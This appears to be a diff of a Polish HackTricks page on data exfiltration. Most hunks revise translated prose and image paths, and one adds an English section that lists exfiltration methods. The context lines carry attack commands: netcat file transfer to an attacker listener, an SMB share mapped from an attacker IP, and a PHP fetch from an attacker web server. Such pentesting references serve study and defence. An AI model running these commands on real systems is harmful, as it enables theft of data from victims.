@@ -10,13 +10,13 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -185,7 +185,19 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows to system operacyjny stworzony przez firmę Microsoft. Jest powszechnie używany na komputerach osobistych i serwerach.
+### Exfiltration
+
+Exfiltration is the unauthorized transfer of data from a target. There are various methods to exfiltrate data from a compromised system. Some common exfiltration methods include:
+
+- **Email**: Sending data as email attachments.
+- **FTP**: Transferring data using File Transfer Protocol.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
+- **DNS**: Sending data using DNS queries.
+- **Cloud Storage**: Uploading data to cloud storage services.
+- **External Drives**: Copying data to external drives like USB flash drives.
+- **Steganography**: Hiding data within other files to avoid detection.
+
+It is essential for attackers to choose exfiltration methods carefully to avoid detection and successfully transfer the stolen data.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -209,13 +221,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC (Netcat) jest potężnym narzędziem do tworzenia połączeń sieciowych wiersza poleceń. Może być używany do przesyłania danych z jednego komputera na drugi poprzez port TCP lub UDP. Może być również używany do nasłuchiwania portów na maszynie zdalnej, co czyni go przydatnym narzędziem do eksfiltracji danych. Aby użyć NC do przesłania pliku na zdalny serwer, możesz użyć polecenia:
-
-```bash
-nc <adres_ip> <port> < plik
-```
-
-Gdzie `<adres_ip>` i `<port>` to adres IP i numer portu serwera zdalnego, a `plik` to nazwa pliku, który chcesz przesłać.
+NC (Netcat) jest potężnym narzędziem do tworzenia połączeń sieciowych wiersza poleceń. Może być używany do przesyłania danych z jednego komputera na drugi poprzez sieć. Może być również wykorzystywany do otwierania portów na zdalnym komputerze, co umożliwia atakującemu uzyskanie dostępu do systemu ofiary. Jako narzędzie wielofunkcyjne, NC jest często wykorzystywane podczas testów penetracyjnych do exfiltracji danych z systemów ofiar.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -288,7 +294,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic Scripting Edition (VBScript) jest językiem skryptowym stworzonym przez Microsoft. Może być używany do tworzenia skryptów w systemach Windows. VBScript może być wykorzystywany do exfiltracji danych poprzez różne metody, takie jak wysyłanie danych na zdalny serwer za pomocą protokołów HTTP lub FTP.
+Visual Basic Scripting Edition (VBScript) jest językiem skryptowym stworzonym przez Microsoft. Może być używany do tworzenia skryptów do automatyzacji zadań w systemach Windows. VBScript może być wykorzystywany do exfiltracji danych poprzez różne techniki, takie jak wysyłanie danych przez HTTP lub FTP.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -342,7 +348,7 @@ Następnie skopiuj tekst i wklej go do okna powłoki systemu Windows, a zostanie
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -356,6 +362,6 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
